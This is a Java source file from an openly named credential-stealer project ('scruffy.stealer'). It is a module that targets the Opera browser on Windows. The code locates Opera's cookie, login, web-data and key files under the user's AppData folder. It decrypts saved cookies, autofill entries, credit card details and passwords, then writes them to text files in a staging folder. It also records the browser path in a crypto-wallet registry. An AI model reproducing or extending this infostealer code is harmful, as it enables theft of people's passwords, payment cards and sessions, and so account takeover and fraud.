package scruffy.stealer.impl.browser;

import java.io.File;
import java.util.Arrays;
import java.util.List;

import org.apache.commons.io.FileUtils;

import scruffy.stealer.impl.coin.wallet;
import scruffy.stealer.utils.utilities;
import scruffy.stealer.utils.decrypt.decrypt_manager;

public class opera extends utilities {

    private static List<String> names = Arrays.asList("cookie", "autofill", "creditcard", "password");

    private static String
		lStatePath = System.getenv("appdata") + "/Opera Software/Opera Stable/Local State",
		cookiePath = System.getenv("appdata") + "/Opera Software/Opera Stable/Cookies",
		webdataPath = System.getenv("appdata") + "/Opera Software/Opera Stable/Web Data",
		loginDataPath = System.getenv("appdata") + "/Opera Software/Opera Stable/Login Data";
	
    public void initialize() throws Exception {
        setup("browser/opera/default/");
    }

    private void setup(String path) throws Exception {
        names.forEach(name -> {
            String decryptedContent = "";
            switch (name) {
                case "cookie": {
                    decryptedContent = new decrypt_manager().getCookies(cookiePath, lStatePath);
                    break;
                }
                case "autofill": {
                    decryptedContent = new decrypt_manager().getAutofills(webdataPath);
                    break;
                }
                case "creditcard": {
                    decryptedContent = new decrypt_manager().getCards(webdataPath, lStatePath);
                    break;
                }
                case "password": {
                    decryptedContent = new decrypt_manager().getPasswords(loginDataPath, lStatePath);
                    break;
                }
            }
            if (!decryptedContent.isEmpty()) {
                assert !wallet.path.containsKey("opera");
                wallet.path.put("opera", System.getenv("appdata") + "/Opera Software/Opera Stable");
                
                try {
                    FileUtils.writeStringToFile(new File(getFolder() + "/" + path + name + ".txt"), decryptedContent, "utf-8", true);
                } catch (Exception ignore) {}
            }
        });
    }
    
}